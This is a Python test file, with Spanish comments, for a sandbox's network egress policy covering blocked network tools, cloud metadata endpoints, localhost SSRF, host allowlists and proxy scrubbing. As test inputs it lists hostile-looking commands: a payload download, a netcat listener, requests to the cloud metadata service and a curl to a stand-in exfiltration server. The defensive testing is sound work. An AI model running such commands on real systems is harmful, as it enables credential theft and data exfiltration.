"""Pruebas de seguridad para contención de red, egress policy y defensa contra SSRF (tests/security/test_network_egress.py)."""

import pytest
from praxeon.policy.egress import EgressMode, EgressPolicy
from praxeon.runtime.sandbox import LocalProcessSandbox, SandboxViolation


def test_network_binaries_blocked_when_network_disabled():
    """Verifica que utilidades de red conocidas sean bloqueadas con allow_network=False."""
    sandbox = LocalProcessSandbox(allow_network=False)
    blocked_commands = [
        "curl -s https://example.com",
        "wget http://example.com/payload.sh",
        "nc -lvp 4444",
        "ssh user@remote.host",
        "ping 8.8.8.8",
    ]
    for cmd in blocked_commands:
        with pytest.raises(SandboxViolation) as exc_info:
            sandbox.execute_command(cmd)
        assert "Violación de política de red" in str(exc_info.value)


def test_cloud_metadata_endpoints_blocked():
    """Verifica que intentos de acceso al endpoint de metadatos cloud (AWS/GCP/Azure) sean bloqueados."""
    policy = EgressPolicy(
        mode=EgressMode.ALLOW_ALL,
        block_cloud_metadata=True,
    )
    sandbox = LocalProcessSandbox(allow_network=True, egress_policy=policy)

    metadata_commands = [
        "curl http://169.254.169.254/latest/meta-data/",
        "curl http://metadata.google.internal/computeMetadata/v1/",
        "python -c \"import urllib.request; urllib.request.urlopen('http://169.254.169.254')\"",
    ]
    for cmd in metadata_commands:
        with pytest.raises(SandboxViolation) as exc_info:
            sandbox.execute_command(cmd)
        assert "metadatos cloud" in str(exc_info.value)


def test_ssrf_localhost_loopback_blocked():
    """Verifica que intentos de SSRF hacia interfaces locales sean interceptados."""
    policy = EgressPolicy(
        mode=EgressMode.ALLOW_ALL,
        block_localhost=True,
    )
    sandbox = LocalProcessSandbox(allow_network=True, egress_policy=policy)

    loopback_commands = [
        "curl http://localhost:8080/admin",
        "curl http://127.0.0.1:3000/internal",
        "curl http://0.0.0.0:9000/metrics",
    ]
    for cmd in loopback_commands:
        with pytest.raises(SandboxViolation) as exc_info:
            sandbox.execute_command(cmd)
        assert "localhost/loopback" in str(exc_info.value)


def test_allowlist_egress_enforcement():
    """Verifica el filtrado estricto bajo el modo EgressMode.ALLOWLIST."""
    policy = EgressPolicy(
        mode=EgressMode.ALLOWLIST,
        allowed_hosts={"api.github.com", "pypi.org"},
        allowed_ports={443},
    )
    
    # Destino permitido
    allowed, reason = policy.evaluate_command_egress("git clone https://api.github.com/repo")
    assert allowed is True
    assert reason is None

    # Destino no permitido
    allowed, reason = policy.evaluate_command_egress("curl https://evil-exfiltration-server.com/leak")
    assert allowed is False
    assert "no presente en la lista blanca" in reason


def test_proxy_environment_scrubbing_when_network_disabled():
    """Verifica que las variables de entorno de red apunten a loopback cerrado."""
    sandbox = LocalProcessSandbox(allow_network=False)
    env = sandbox._sanitize_environment()
    assert env["http_proxy"] == "http://127.0.0.1:0"
    assert env["https_proxy"] == "http://127.0.0.1:0"
    assert env["all_proxy"] == "http://127.0.0.1:0"
